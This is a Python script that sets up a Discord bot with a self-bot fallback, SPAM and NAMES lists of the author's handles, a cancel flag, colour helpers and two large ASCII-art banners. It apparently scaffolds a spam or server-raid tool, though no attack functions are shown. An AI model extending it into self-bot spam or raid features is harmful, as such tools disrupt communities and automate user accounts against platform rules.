import discord
from discord.ext import commands
import asyncio
import os
import random
import re
import time
import sys
from colorama import init, Fore

init(autoreset=True)
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
RED = Fore.RED

try:
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix="!", intents=intents)
except AttributeError:
    bot = commands.Bot(command_prefix="!", self_bot=True)

cancel_flag = False

def check_cancel():
    global cancel_flag
    return cancel_flag

def reset_cancel():
    global cancel_flag
    cancel_flag = False

async def wait_for_cancel():
    global cancel_flag
    loop = asyncio.get_running_loop()
    await loop.run_in_executor(None, input, YELLOW + "\n[!] Press ENTER to cancel: ")
    cancel_flag = True

SPAM = ["Alhrbi", ".alhrbi", "rayan", "MaybeRayan"]
NAMES = ["Alhrbi", ".alhrbi", "rayan", "MaybeRayan"]

def printc(text, color=YELLOW):
    print(color + text)

def inp(prompt):
    return input(YELLOW + prompt)

LOGO_MAIN = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣟⣳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⣹⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⡔⠻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠒⠸⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡿⡍⠀⢙⢅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠅⠀⠀⠘⠆⠀⢀⡄⢰⣮⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⢺⡃⢀⡀⠀⠀⠀⠀⢀⠀⠤⠄⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡆⠀⠀⠀⠚⡄⣃⣰⡟⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣄⠀⡄⠀⠀⠀⠘⡅⣴⠂⢀⠠⡰⠘⡁⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⣀⢸⣧⠀⠀⠀⠈⢾⣼⠏⠀⣿⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠈⢆⡁⠀⠀⠀⠤⡷⠠⠂⣁⠤⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⠄⠀⠀⠀⢸⡩⠀⢀⣿⠀⠸⣆⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⠘⠕⠀⠀⠀⢀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣧⠁⠀⠀⠀⠼⡁⠌⡜⢸⢉⣳⠏⣇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣢⠀⠁⡄⠀⠘⠀⠀⠀⠠⣻⠀⠀⢀⢀⡠⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⠘⡾⡴⠊⣮⠓⢀⣟⠑⠄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⡔⠼⠁⢆⠀⡸⠀⠀⠀⠀⠀⠁⣯⠀⠀⡊⠂⠀⠀⠀⠀⠀⠀⣀⠤⡠⢤⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠁⠀⠘⡶⡃⠀⢌⡧⠐⠠⢘⢂⠀⠀⠀
⠀⠀⠀⠀⠀⣠⠚⢳⠀⠁⡄⠀⠑⢄⠀⠀⠀⠀⠀⡀⡇⠀⠀⢀⣄⡀⠀⠀⡠⠐⠈⣊⡉⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⣿⠄⠀⠀⠀⠀⠀⢰⠇⠀⠀⢫⠀⠱⡀⣦⣧⠠⡀⠀
⠀⠀⠀⠠⠚⠃⠈⠘⡠⠂⠘⡀⠀⢾⠀⠀⠀⠀⠀⣸⠃⠀⠀⣞⠉⠪⡍⠊⠠⢀⡀⠀⠀⠀⠀⠀⠀⠀⠂⠤⡀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠡⢐⣜⠊⠈⠉⢱⠏⡏⠀⠈⠀
⠀⠀⠀⠀⠀⠀⢘⠀⢊⢦⡶⠙⠄⠀⠀⠀⠀⠀⠰⡘⠀⠀⠀⢻⡆⠂⠘⢶⠀⠂⠈⠑⠀⠶⢓⠀⠀⠤⢀⣀⠀⠁⠦⠡⡄⢳⠄⠀⠀⠀⠀⠀⠀⠁⠑⡱⡀⣸⠟⠀⣇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠮⠀⠀⠢⣕⠀⠀⠀⠀⠀⠀⠀⣰⠇⠀⠀⢀⠸⡇⠀⡼⠐⠹⣄⠀⠀⠀⠀⠀⠙⠒⢆⠔⠀⠀⠂⣐⡀⢥⠒⠥⠤⠀⠀⠀⠀⠀⠀⠀⢀⣿⡛⠀⠀⣇⢠⠀⠀
⠀⠀⠀⠀⠀⡄⣸⣇⠀⣀⢼⡀⠀⠀⠀⠀⠀⡠⢣⠴⢲⡬⣥⣒⢣⠠⠁⢠⣒⣈⠳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠒⠀⠈⢦⡀⠀⠀⠀⠀⠀⠀⢨⡟⠡⠀⢀⡟⠘⢁⠀
⠀⠀⠀⠀⠠⡡⢫⣽⠞⠀⠀⠑⠢⠄⠀⢀⡼⠉⣡⠖⠁⠀⠀⠘⢺⣤⠞⠉⠀⠀⠙⢻⣦⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⢮⢦⣭⡉⠁⠀⢋⢵⡦⣌⣾⠁⠇⠀⠀
⠀⠀⠀⠀⡘⠀⢸⠋⠀⡀⠄⠀⠀⠀⡡⠋⣠⠞⠁⠀⠀⠀⠀⠰⢌⠀⠀⠀⠀⠀⠀⠀⠀⢷⡊⠰⠄⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠈⠻⣷⠬⠙⡅⠀⠀⠀⠈⢼⣽⣧⡇⠀⠀
⠀⠀⢀⠌⠀⠀⠘⡇⠁⠠⠀⠀⣠⠞⠁⠞⠁⠀⠀⠀⢀⣔⠮⠷⠁⠀⡀⠡⡀⠀⠀⠀⠀⠀⠡⡄⠀⠀⠀⠀⠢⠀⠀⠀⠀⠀⠀⠈⠀⠀⠈⠿⢄⠀⠈⠀⠀⠀⠀⠈⣷⢫⠀⠀
⠀⠀⣢⡀⠀⠀⠀⢻⢇⣀⣂⡜⣡⠀⠀⠀⠀⠀⠀⠀⠈⠄⠀⠀⠀⠀⠑⡀⠹⡄⠀⠀⠀⠀⠀⠌⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠂⠐⠒⠓⠺⢷⣦⡶⠖⠒⠀⢻⢻⠀⡄⠀
⠄⠞⢃⠃⠀⠀⠄⠀⢩⢗⣉⠖⠁⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⡀⡈⢆⠀⠀⠀⠀⠀⠈⡗⠄⡀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣷⠻⠶⡐⡺⠟⠀⠁⠂⠀
⠀⠀⢸⢠⡀⣶⠶⠞⠃⠁⠁⠀⠀⠀⠀⠀⠀⡀⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡰⠀⠡⡀⡄⠀⠀⠀⠘⡄⠈⠰⠤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⣿⣠⠀⠀⣀⠀⡀⠀⠠⠀
⠀⠀⠀⠎⠀⠈⣦⡤⣄⡀⠀⠀⠀⠀⢀⢆⣤⠗⠡⡠⠄⣀⠀⠀⠀⠀⠀⠀⠀⠈⡳⠀⠘⣸⣄⠀⠀⠈⠜⡄⠀⠀⠈⠠⡠⠀⠤⠀⠀⠀⠀⠀⠀⠘⣮⣇⣤⡴⣶⣿⣝⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠸⢳⣲⠩⡳⢤⣤⣾⠯⠊⢁⣀⣀⣒⣐⡒⣢⢄⠡⠀⠀⠀⠀⠀⠈⠳⠀⠘⡇⠢⠠⠈⠂⣻⡔⣁⡀⡀⠀⢠⠀⠀⠀⠀⠀⠀⠀⢠⣷⣿⠟⡟⡟⣫⣽⡄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢷⠁⠈⠺⡇⠀⠐⢄⠀⠀⠘⢧⣉⣀⠜⠀⠀⠑⠀⠀⠀⠀⠀⠀⠑⣄⠰⠀⠙⠪⡄⠻⣇⠀⠅⠙⠛⢉⡿⡍⠀⠒⢒⠄⠀⡾⣿⢹⢈⣿⣿⢊⡞⡍⠆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⣧⡐⢳⣥⠀⠀⠀⠈⠀⠺⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠣⡧⠀⠀⠈⠓⠼⣷⣔⡈⠩⠁⠀⠵⡄⠊⠀⠀⢸⣇⡏⣿⣾⠏⢘⠆⡽⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠁⠈⡽⡆⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⢄⠀⠀⠀⠀⠉⠻⠓⢤⢀⣀⡀⣧⠀⠀⢰⣜⢻⡇⢻⣿⠀⠸⠄⣱⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠉⣷⠀⠀⠀⠀⠸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⣺⢸⢀⢰⣿⣾⠀⠘⡇⠀⠀⡑⡏⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣺⠹⣜⣄⣻⡇⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣺⣿⢸⣾⡟⡸⢀⣶⠃⠀⠀⠃⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⢾⢉⣯⣄⢷⠀⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣷⢻⡆⣿⣶⣷⣯⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⠟⠁⣹⠇⣯⡏⠎⣦⠀⠀⠀⠈⢧⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠑⢸⣷⣿⣽⡍⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣝⢸⠜⡯⣁⠋⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⠀⢸⣿⠛⣿⣗⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡌⠈⢸⢮⡇⣮⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠂⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠀⢀⣾⡋⢨⣯⠿⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠙⠀⢣⠃⠈⢣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⢀⣾⢻⣶⡜⡏⠀⠻⣣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠄⠀⢈⡷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠂⣷⠓⣶⡗⠀⠀⠈⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠈⠀⠘⢆⡀⠀⠀⠀⠀⣀⣀⠀⡀⣀⡀⡀⡀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢀⡰⠉⡄⢀⡻⠀⠙⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠑⢄⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⣠⠊⠀⠀⣇⡼⠁⠀⠀⠘⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠈⠛⠋⠃⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⠀⠀⢽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠈⠳⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠚⠁⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢀⡀⠀⠀⠀⠀⠀⠀⠀⠛⢦⡀⠀⠀⠀⠀⠀⠀⡠⠊⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡜⠲⢶⣬⣵⣒⠀⠠⠄⢀⣀⡙⠢⢀⣀⡤⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢗⡚⠋⠐⠂⠈⠡⠙⣛⠭⠵⠂⠌⡱⣦⣤⣄⠘⡀⠠⣶⣖⡶⠦⠴⠯⠭⠽⠟⠛⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠐⠂⠤⠀⠄⣃⣀⣁⢈⣽⡾⠛⢛⣳⣦⠈⠀⡀⢀⠀⢀⠠⠀⠀⠀⠀⠀⠘⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠈⢩⡇⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⠤⡤⠤⠿⠁⠀Alhrbi.com
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠇⠀  githun.com/5cxx
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡁
"""

DRAGON = r"""
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣛⣛⣟⢩⣍⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣯⣿⣿⣿
⣿⣿⣿⣿⣿⢟⣉⠋⠉⠻⣿⣿⣿⡿⠋⠡⠃⠋⠩⠉⠁⢈⠉⠀⠀⠈⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣶⣿⣿⣿⣿
⣿⣿⣿⣿⡇⣿⣿⣿⣦⡠⣤⣋⠉⠀⠀⣠⣦⠲⣮⡳⣦⡊⠢⡀⠂⢑⠱⡀⢙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣽⣾⣿⣿⣿⣿
⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⡎⢉⠴⣀⠂⠇⢿⣧⠱⡝⢏⠈⡀⠜⣆⠀⡇⠀⡀⣀⢙⠻⣿⣿⣿⣿⣿⣿⢟⣿⣿⣽⣽⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⡘⢀⠸⢺⠀⠸⣨⡛⠇⠀⡌⠆⢿⣌⠈⠄⠃⡀⠐⢈⠀⠾⣭⣟⡻⢿⣿⣿⢿⣿⣾⣻⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⠃⠀⠘⢰⠀⠀⡁⠐⢟⠁⠇⠀⢀⠙⠦⠀⡆⢸⠀⠈⠢⣀⠺⠽⢿⣿⣞⡽⣻⠷⣿⣻⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣸⣿⣿⣿⣿⠀⢠⠀⢸⢰⠀⠂⠀⠘⡄⢨⢸⠸⠛⠀⠀⠀⠘⠀⠀⢍⠒⠿⢒⣤⣾⣿⣿⠗⣾⣶⠽⡻⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣇⣿⣿⣿⣿⡄⠀⠸⠚⠰⠧⠀⠰⣤⣄⠈⣀⢄⢤⣈⢂⢀⠀⠀⠀⠈⣠⣬⣶⣝⡻⢿⡟⣸⣿⣿⣿⣾⣔⡝⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡸⣿⣿⣿⡇⠁⠀⠂⠀⠰⠄⣄⣾⡟⣾⣿⣿⣿⣧⠏⠀⠀⡠⡆⡄⣿⣿⣿⣿⣿⣷⢭⡻⢿⣿⣿⣿⣿⣿⣿⣮⡻
⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⡇⠐⠀⠀⠀⡈⢿⣿⣿⣿⣿⣿⣿⣿⣤⠖⠀⠀⡀⠁⠇⣿⣿⣿⣿⣿⣿⠺⢟⣥⣶⣶⣾⣿⣿⣿⡿⣳
⣿⣿⣿⣿⣿⣿⣿⡞⣿⣿⣿⡠⠀⠐⢠⣀⢠⡸⢿⣿⣿⣯⣾⡿⡋⣴⢃⡜⠀⠄⢰⣿⣿⣿⠿⣻⣽⣾⣿⣿⣿⣿⣿⣿⡿⢛⣽⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣷⣵⡄⠀⠣⢆⢿⣷⣎⣽⣛⣫⣞⡉⠂⢈⡠⢀⣪⣭⣿⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⢟⣯⣾⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⡀⣀⣀⡀⣁⠂⢿⣿⣿⣿⣷⣄⠚⠼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣛⣭⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⢿⢿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠩⣽⣟⣯⣴⣿⣦⣌⠛⠟⣿⣿⣿⠿⣛⣭⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣊⢯⣻⣿⣿⣿⣿⣿⣿⣿⣷⡈⠻⢿⣿⣟⢿⣿⣷⣦⣉⠩⢶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢚⣷⣽⣿⣿⣿⣿⣿⣿⣿⠃⣶⣦⣍⠻⣷⣜⢿⣿⣿⣷⡄⢙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⣿⣿⣿⡟⣸⣿⣿⣿⣷⠈⢻⣷⣻⣿⣿⣿⡘⣿⣮⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⢿⣿⡟⠀⠛⠛⠉⠉⠁⠀⠀⢻⡇⣿⣿⣿⡇⠻⠛⠃⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣸⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⣿⣿⣿⠃⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡿⠃⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣶⣾⣿⣷⣶⣦⣤⣀⣀⣂⣀⣠⣤⢶⣤⣍⠀⠀⣀⢀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢸⣿⣿⡟⢰⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣴⣿⣿⠟⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡫⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢟⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣭⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣻⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⢟⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣵⣿⣿⣿⣿⣿⠼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⢟⠄⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⡔⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠏⢀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⣰⠇⠀⠈⡈⣦⠄⡉⠛⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⣁⣶⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣏⠰⣿⠀⠀⢧⠃⢸⣿⣾⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣾⣿⣿⠂⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡦⣬⣤⣧⠘⣁⡈⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⠀⡠⡸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣇⣿⣿⣿⡇⠘⣿⣆⠹⣿⣿⣿⣿⣷⡄⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⡽⣦⡀⢈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡼⣿⣿⣷⣦⣿⣿⣄⢻⣿⣿⣿⣿⣇⢿⣆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢁⣯⣟⣿⣄⣓⣻⢭⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣷⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡜⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
